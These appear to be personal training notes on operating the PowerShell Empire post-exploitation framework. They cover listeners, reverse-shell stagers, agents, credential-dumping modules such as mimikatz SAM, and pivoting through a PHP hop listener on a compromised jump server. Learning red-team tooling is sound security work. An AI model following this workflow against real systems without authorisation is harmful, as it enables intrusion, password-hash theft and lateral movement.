Powershell Empire is build to attack windows hosts

Empire itself is the CLI application
It has a GUI 'Starkiller'

To reset the installation: sudo setup/reset.sh

=================================================
Starkiller

to use starkiller empire must be started with
--headless (no cli)
or
--rest (cli, but api exposed)

default credentials
https://localhost:1337
empireadmin:password123

In the CLI:
help <command> to get help on some command

the CLI supports autocomplete with tab
"uselistener [space][tab][tab]" to show all available listeners, for example
"set [space][tab][tab]" to show all options that can be set
"info" to get info on the current module (such as http-listener)

=================================================
Overview

Listeners:
    Listen for connections and facilitate further exploitation

    Listeners receiver connections from stagers.
    Listeners can be used more than once, they don't die after their initial connection
    Default is HTTP listener

    CLI:
        uselistener http
        set BindIP <bindip>
        set Host <hostname/bindip>
        set Port <port>
        set Name <name>
        execute
        back

    Stop listener:
        listeners
        kill <name>

    delete with:
        listeners
        delete <name>


Stagers:
    Payloads - delivery mechanism for agents, generate reverse shells in conjuction with listeners.
    multi/launcher is always a good option if in doubt

    CLI:
        usestager multi/bash
        set Listener <name>
        execute

    run that somehow on the server...
    since this is post exploitation, that shouldn't be a problem

Agents:
    Sessions to compromised targets

    CLI:
        agents
        rename <name> <newname>
        interact <name>
        help
        <interact as desired>

    The type of interactions available depend on the type of stager

Modules:
    Modules are used with agents to perform further exploitation

    Modules are sorted by language (Powershell, Python) and by type.
    Types are:
        code execution
        collection
        credentials
        exfiltration
        exploitation
        lateral movement
        management
        persistence 
        privesc
        recon
        situational awareness 
        trollsploit

    Empire categorizes modules based on MITRE ATT&CK and provides the techniques used for each module in the ATT&CK naming convention such as T1552 (https://attack.mitre.org/techniques/T1552/004/). For more information about ATT&CK check out the MITRE page (https://attack.mitre.org/).

    searchmodule helps to find modules
    searchmodule winpeas
    searchmodule sam
    ...

    Some useful modules:

    pvivesc/sherlock:
        checks for potential privesc vectors on the target

    powershell/credentials/mimikatz/sam*:
        gets SAM database (password hashes)

    other enums:
        winpeas, seatbelt

    Outputs are available in starkiller/reporting 


Plugins:
    Extend the functionality of the framework.
    place pythonscripts or softlinks to them in the empire plugins folder
    use plugins command to see available plugins
    use plugin <name> command to load the plugin
    use start <name> to start the plugin
    use stop <name> to stop the plugin

    Usage of plugins works differently for each plugin. The socks server plugin uses a start and stop command along with the name of the plugin to start up a new proxy server similar to putting a proxy directly onto the host, but plugins are directly contained within Empire.

=================================================
How to set up empire

1. Set up a listener
2. Create payload for the listener
3. Run payload on the target

=================================================
How to set up empire through a pivot.

Empire can't go through socat port forwarding unfortunately.
We need to set up a "hop" listener

A hop listener is used to generate the payloads for a "jump" server and the listener is served from there
The hop listener is a placeholder that is used to create a set of .php files that will be uploaded to the Jump server and be served by an http server from there. It contains instructions to connect back to us

We could use a preinstalled webserver or run our own.

Create a http_hop
    set RedirectListener to an existing listener
    set Host to the hostname or ip address of the jump server
    set Port to the port you want to open on the jump server
    execute to generate the files
    upload the files to the compromised jump server
    start a webserver that can execute php and serve the files

Running standalone php-debug server to serve the files
php -S 0.0.0.0:<port> &> /dev/null &

Create a stager for the http_hop listener and execute on the remote target

the remote target will connect to the hop, which will in turn connect back to the listener we set up as the http_hop RedirectListener


The target will show up with the ip of the jump server though.
